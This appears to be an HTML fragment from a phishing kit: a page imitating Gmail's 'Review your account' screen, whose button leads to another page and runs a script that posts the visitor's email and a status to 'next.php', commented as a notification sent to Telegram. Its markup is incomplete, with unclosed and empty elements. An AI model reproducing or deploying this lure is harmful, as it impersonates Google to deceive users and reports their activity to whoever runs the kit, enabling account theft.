    <div class="gmail-container">

            <div class="gmail-logo"></div>
            <h1 class="account-title">Review your account</h1>
            <div class="account-subtitle">Check your account information and security settings</div>

            <div class="account-details">
                <div class="account-info">
                    <div class="account-avatar">J</div>
                    <div class="account-text">
                        <div class="account-name">John Doe</div>
                        <div class="account-email">john.doe@gmail.com</div>

                </div>

                <div class="account-stats">
                    <div class="stat-item">

                    </div>
                    <div class="stat-item">

            <a href="simple_tiktok.html" class="gmail-review-btn" onclick="startReview()">
                Review your account
            </a>

            <div class="footer-links">
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
                <a href="#">Help</a>
            </div>
        </div>
    </div>

    <script>
        function startReview() {
            // Send review notification to Telegram
            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'next.php', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.send('review=1&account=john.doe@gmail.com&status=Review Started');
        }
    </script>
